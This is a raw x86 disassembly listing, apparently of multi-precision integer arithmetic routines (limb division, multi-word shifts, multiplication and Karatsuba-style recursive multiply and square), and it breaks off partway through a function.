test esi, esi
mov dword [var_14h], esi
js 0x808c608
mov ebx, dword [arg_ch]
cmp dword [var_14h], ebx
jl 0x808c657
sub dword [arg_10h], 4
cmp edx, dword [var_18h]
je 0x808c615
div dword [var_18h]
mov dword [var_2ch], eax
mov ecx, edx
mul dword [var_30h]
mov esi, dword [arg_10h]
mov esi, dword [esi]
mov dword [var_28h], esi
nop
lea esi, [esi]
cmp edx, ecx
ja 0x808c5db
jne 0x808c5ec
cmp eax, dword [var_28h]
jbe 0x808c5ec
add ecx, dword [var_18h]
dec dword [var_2ch]
sub eax, dword [var_30h]
sbb edx, 0
cmp ecx, dword [var_18h]
jae 0x808c5d0
mov edi, dword [var_14h]
mov esi, dword [var_2ch]
mov ebx, dword [arg_8h]
mov dword [ebx + edi*4], esi
mov edi, dword [var_28h]
sub edi, eax
sbb ecx, edx
mov eax, edi
mov edx, ecx
dec dword [var_14h]
jns 0x808c5a3
mov ecx, dword [arg_10h]
mov dword [ecx + 4], edx
mov dword [ecx], eax
jmp 0x808c50a
lea ecx, [edx + eax]
mov dword [var_2ch], 0xffffffff
cmp ecx, edx
jae 0x808c642
sub ecx, dword [var_30h]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edi]
mov edx, ecx
mov ecx, dword [var_14h]
add eax, dword [var_30h]
adc edx, 0
mov dword [ebx + ecx*4], 0xffffffff
jmp 0x808c603
mov edx, dword [var_30h]
lea eax, [edx - 1]
test edx, edx
cmovne edx, eax
mov eax, dword [var_30h]
neg eax
jmp 0x808c5c3
mov esi, dword [arg_10h]
mov dword [esi], 0
jmp 0x808c5b3
mov eax, dword [arg_1ch]
test eax, eax
jne 0x808c3ad
mov eax, 1
cdq
idiv dword [var_10h]
jmp 0x808c50d
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov ebx, dword [eax]
mov ecx, dword [edx + esi*4 - 4]
cmp ecx, ebx
jb 0x808c697
sub ecx, ebx
mov dword [var_10h], 1
mov eax, dword [arg_8h]
mov edi, dword [arg_ch]
lea eax, [eax + edi*4]
mov edi, esi
sub edi, 2
mov dword [arg_8h], eax
js 0x808c6bf
mov edx, dword [arg_10h]
mov esi, dword [arg_8h]
mov eax, dword [edx + edi*4]
mov edx, ecx
div ebx
mov dword [esi + edi*4], eax
mov ecx, edx
dec edi
jns 0x808c6aa
mov eax, dword [arg_ch]
mov edi, dword [arg_ch]
shl eax, 2
sub dword [arg_8h], eax
dec edi
js 0x808c6e1
xor esi, esi
mov edx, ecx
mov eax, esi
div ebx
mov ecx, edx
mov edx, dword [arg_8h]
mov dword [edx + edi*4], eax
dec edi
jns 0x808c6d0
mov ebx, dword [arg_10h]
mov dword [ebx], ecx
jmp 0x808c50a
nop
nop
nop
nop
nop
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
sub esi, 4
mov ebx, dword [esi + edx*4]
xor eax, eax
shld eax, ebx, cl
dec edx
je 0x808c73f
push eax
test dl, 1
jne 0x808c72a
mov eax, ebx
lea esi, [esi]
mov ebx, dword [esi + edx*4]
shld eax, ebx, cl
mov dword [edi + edx*4], eax
dec edx
mov eax, dword [esi + edx*4]
shld ebx, eax, cl
mov dword [edi + edx*4], ebx
dec edx
jne 0x808c720
shl eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shl ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
lea edi, [edi + edx*4 - 4]
lea esi, [esi + edx*4]
neg edx
mov ebx, dword [esi + edx*4]
xor eax, eax
shrd eax, ebx, cl
inc edx
je 0x808c79f
push eax
test dl, 1
jne 0x808c78a
mov eax, ebx
nop
mov ebx, dword [esi + edx*4]
shrd eax, ebx, cl
mov dword [edi + edx*4], eax
inc edx
mov eax, dword [esi + edx*4]
shrd ebx, eax, cl
mov dword [edi + edx*4], ebx
inc edx
jne 0x808c780
shr eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shr ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov edi, dword [arg_8h]
add eax, dword [arg_18h]
cmp dword [arg_18h], 0x1f
lea eax, [edi + eax*4 - 4]
mov dword [var_10h], eax
jg 0x808c8d3
mov edx, dword [arg_18h]
xor eax, eax
test edx, edx
je 0x808c851
mov edx, dword [arg_14h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808c8b4
je 0x808c891
xor eax, eax
cmp eax, dword [arg_10h]
jge 0x808c814
mov dword [edi + eax*4], 0
inc eax
cmp eax, dword [arg_10h]
jl 0x808c807
xor eax, eax
mov ecx, dword [arg_10h]
mov ebx, 1
mov dword [edi + ecx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jge 0x808c851
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx + ebx*4]
cmp eax, 1
ja 0x808c875
mov eax, 0
je 0x808c859
mov edx, dword [arg_10h]
inc ebx
mov dword [edi + edx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jl 0x808c830
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_ch], ecx
mov dword [var_8h], eax
call fcn.0808c2a0
jmp 0x808c842
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808c842
xor edx, edx
cmp edx, dword [arg_10h]
jge 0x808c814
lea esi, [esi]
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [edi + edx*4], eax
inc edx
cmp edx, dword [arg_10h]
jl 0x808c8a0
jmp 0x808c814
mov dword [var_ch], eax
mov edx, dword [arg_ch]
mov dword [esp], edi
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cae0
jmp 0x808c816
mov ecx, dword [arg_18h]
mov edx, dword [arg_14h]
lea ebx, [ecx*8 + 0x10]
sub esp, ebx
mov dword [var_ch], ecx
lea eax, [var_23h]
mov dword [var_8h], edx
mov ecx, dword [arg_ch]
and eax, 0xfffffff0
mov dword [esp], edi
mov dword [var_18h], eax
mov dword [var_sp_10h], eax
mov dword [var_4h], ecx
call fcn.0808cc10
mov eax, dword [arg_18h]
mov edx, dword [arg_18h]
sub dword [arg_10h], edx
shl eax, 2
add dword [arg_ch], eax
add edi, eax
cmp dword [arg_10h], edx
jl 0x808c9d8
sub esp, ebx
mov dword [var_20h], eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
mov dword [var_1ch], ecx
cmp dword [arg_18h], 0x1f
jg 0x808cab3
mov eax, dword [arg_18h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov eax, dword [var_1ch]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cb40
mov edx, dword [var_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_ch], eax
call fcn.0808c2a0
mov ecx, dword [var_20h]
mov dword [var_14h], eax
mov esi, dword [arg_18h]
lea ebx, [ecx + edi]
mov ecx, dword [var_1ch]
add ecx, dword [var_20h]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca90
mov esi, dword [arg_18h]
dec esi
je 0x808c9c0
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca90
dec esi
jne 0x808c9a5
nop
lea esi, [esi]
mov edx, dword [arg_18h]
add edi, dword [var_20h]
sub dword [arg_10h], edx
mov eax, dword [var_20h]
add dword [arg_ch], eax
cmp dword [arg_10h], edx
jge 0x808c930
mov eax, dword [arg_10h]
test eax, eax
jne 0x808c9e9
mov edx, dword [var_10h]
mov eax, dword [edx]
jmp 0x808c851
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov edx, dword [arg_18h]
mov dword [var_sp_10h], ecx
mov dword [var_ch], eax
mov ecx, dword [arg_14h]
mov eax, dword [var_18h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808c7c0
mov dword [esp], edi
mov edx, dword [arg_18h]
mov ecx, dword [var_18h]
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808c2a0
mov dword [var_14h], eax
mov ecx, dword [var_18h]
mov esi, dword [arg_10h]
mov eax, dword [arg_18h]
shl eax, 2
add ecx, eax
lea ebx, [eax + edi]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca6d
dec esi
je 0x808c9df
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca6d
dec esi
jne 0x808ca56
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9df
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9df
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ca80
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9c0
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9c0
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808caa3
jmp 0x808c9c0
mov edx, dword [var_18h]
mov ecx, dword [arg_18h]
mov eax, dword [arg_14h]
mov dword [var_sp_10h], edx
mov dword [var_ch], ecx
mov edx, dword [arg_ch]
mov ecx, dword [var_1ch]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cc10
jmp 0x808c95a
nop
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
mov dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808cb00
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_10h]
mov edi, dword [arg_14h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808cbf0
je 0x808cbd9
xor eax, eax
cmp eax, edi
jge 0x808cb71
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808cb65
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808cb9f
mov edx, dword [arg_10h]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808cbc0
mov eax, 0
je 0x808cba7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808cb82
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov dword [var_ch], edi
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_8h], ecx
call fcn.0808c2a0
jmp 0x808cb94
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.08090d80
jmp 0x808cb94
xor edx, edx
cmp edx, edi
jge 0x808cb71
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808cbe0
jmp 0x808cb71
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808cb73
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_14h], 1
je 0x808ccd1
mov esi, dword [arg_14h]
dec esi
cmp esi, 0x1f
jg 0x808cca8
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov eax, dword [edx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov ecx, dword [arg_14h]
mov eax, dword [edx + esi*4]
mov dword [esp], ebx
mov dword [var_ch], eax
mov dword [var_8h], ecx
mov eax, dword [arg_10h]
mov dword [var_4h], eax
call fcn.08090d80
mov ecx, dword [arg_14h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_ch]
mov dword [var_10h], eax
mov dword [var_8h], edx
mov eax, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cc49
mov esi, dword [arg_14h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d03c
mov edx, dword [arg_10h]
lea eax, [esi*4]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cb40
mov eax, dword [arg_ch]
mov dword [var_8h], esi
lea ebx, [eax + esi*4]
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d016
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.0808d570
mov dword [var_bp_10h], 0
mov ecx, dword [arg_10h]
lea edi, [esi*4]
mov dword [var_8h], esi
mov ebx, ecx
mov dword [var_4h], ecx
add ebx, edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808cff5
mov eax, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
add eax, edi
mov dword [esp], eax
call fcn.0808d570
xor dword [var_bp_10h], 1
cmp esi, 0x1f
jg 0x808cfc9
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
lea eax, [ecx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [esp], eax
call fcn.0808cb40
test esi, esi
jle 0x808cdd5
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov edx, esi
lea ebx, [ecx + esi*4]
lea ecx, [ecx + eax*4]
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808cdc8
mov edi, dword [arg_14h]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov ecx, dword [arg_14h]
add edi, esi
lea eax, [edx + edi*4]
mov dword [var_8h], eax
lea eax, [edx + ecx*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov ebx, eax
mov eax, dword [var_bp_10h]
test eax, eax
je 0x808cfa2
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808cf76
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_18h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov eax, dword [arg_18h]
mov edx, dword [arg_8h]
mov ecx, dword [arg_14h]
mov dword [var_8h], eax
lea eax, [edx + esi*4]
mov dword [var_ch], ecx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808ceb0
mov eax, dword [arg_8h]
mov dword [var_14h], esi
lea ecx, [eax + edi*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808cf50
mov edx, esi
dec edx
mov dword [var_14h], edx
je 0x808ceb0
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf50
dec dword [var_14h]
jne 0x808ce98
xor edx, edx
cmp edx, esi
jge 0x808cec7
mov ecx, dword [arg_18h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ceb6
mov edx, dword [arg_18h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808cca0
mov eax, dword [arg_14h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808cf2b
dec ebx
je 0x808cca0
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf2b
dec ebx
jne 0x808cf14
jmp 0x808cca0
cmp ecx, esi
je 0x808cca0
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808cca0
mov esi, esi
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf40
jmp 0x808cca0
cmp ecx, edi
je 0x808ceb0
mov ebx, dword [var_14h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808ceb0
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf66
jmp 0x808ceb0
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_ch]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808ce4f
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
jmp 0x808ce29
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [edx + esi*4]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808cdb6
mov eax, dword [arg_8h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
add eax, edi
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0808d570
jmp 0x808cd90
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.0808d570
mov dword [var_bp_10h], 1
jmp 0x808cd4a
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [esi*4]
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cd0b
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_ch]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808d130
je 0x808d119
xor eax, eax
cmp eax, edi
jge 0x808d0b1
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808d0a5
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808d0df
mov edx, dword [arg_ch]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808d100
mov eax, 0
je 0x808d0e7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808d0c2
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edi
mov dword [var_8h], edx
mov dword [var_4h], ebx
mov dword [esp], ebx
call fcn.0808c2a0
jmp 0x808d0d4
lea esi, [esi]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808d0d4
xor edx, edx
cmp edx, edi
jge 0x808d0b1
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808d120
jmp 0x808d0b1
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808d0b3
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_10h], 1
mov edi, dword [arg_ch]
je 0x808d1f1
mov esi, dword [arg_10h]
dec esi
cmp esi, 0x1f
jg 0x808d1d5
mov eax, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], eax
call fcn.0808d080
mov eax, dword [edi + esi*4]
mov dword [var_4h], edi
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov eax, dword [edi + esi*4]
mov dword [esp], ebx
mov dword [var_4h], edi
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
call fcn.08090d80
mov ecx, dword [arg_10h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_14h]
mov ecx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [esp], ecx
call fcn.0808d150
jmp 0x808d182
mov esi, dword [arg_10h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d494
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
lea eax, [edi + esi*4]
mov dword [var_4h], eax
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d080
lea ebx, [edi + esi*4]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d47d
mov eax, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], edi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.0808d570
cmp esi, 0x1f
jg 0x808d458
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808d080
test esi, esi
jle 0x808d28d
mov edx, dword [arg_8h]
mov eax, dword [arg_10h]
lea ebx, [edx + esi*4]
lea ecx, [edx + eax*4]
mov edx, esi
mov esi, esi
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808d280
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, esi
lea eax, [ecx + edx*4]
mov dword [var_10h], edx
mov dword [var_8h], eax
mov eax, dword [arg_10h]
shl eax, 2
mov dword [var_14h], eax
mov eax, ecx
add eax, dword [var_14h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov ebx, eax
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808d436
mov ecx, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ecx
call fcn.0808d080
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808d368
mov eax, dword [var_10h]
mov edx, dword [arg_8h]
mov dword [var_18h], esi
lea ecx, [edx + eax*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808d410
mov eax, esi
dec eax
mov dword [var_18h], eax
je 0x808d368
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d410
dec dword [var_18h]
jne 0x808d350
xor edx, edx
cmp edx, esi
jge 0x808d381
mov esi, esi
mov ecx, dword [arg_14h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808d370
mov edx, dword [arg_14h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808d1cd
mov eax, dword [arg_10h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808d3e7
dec ebx
je 0x808d1cd
mov esi, esi
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d3e7
dec ebx
jne 0x808d3d0
jmp 0x808d1cd
cmp ecx, esi
je 0x808d1cd
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d1cd
lea esi, [esi]
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d400
jmp 0x808d1cd
cmp ecx, edi
je 0x808d368
mov ebx, dword [var_18h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d368
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d426
jmp 0x808d368
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
add eax, dword [var_14h]
mov dword [var_ch], eax
mov eax, dword [arg_14h]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d2fd
mov ecx, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
call fcn.0808d150
jmp 0x808d26c
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edx
jmp 0x808d248
mov eax, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
mov ecx, dword [arg_8h]
mov dword [var_ch], eax
lea eax, [edi + esi*4]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d21b
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_8h], ebx
mov ecx, dword [arg_10h]
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov edx, dword [arg_14h]
mov esi, dword [arg_8h]
cmp ebx, ecx
je 0x808d52a
cmp edx, 0x1f
jg 0x808d500
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808cb40
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_ch], edx
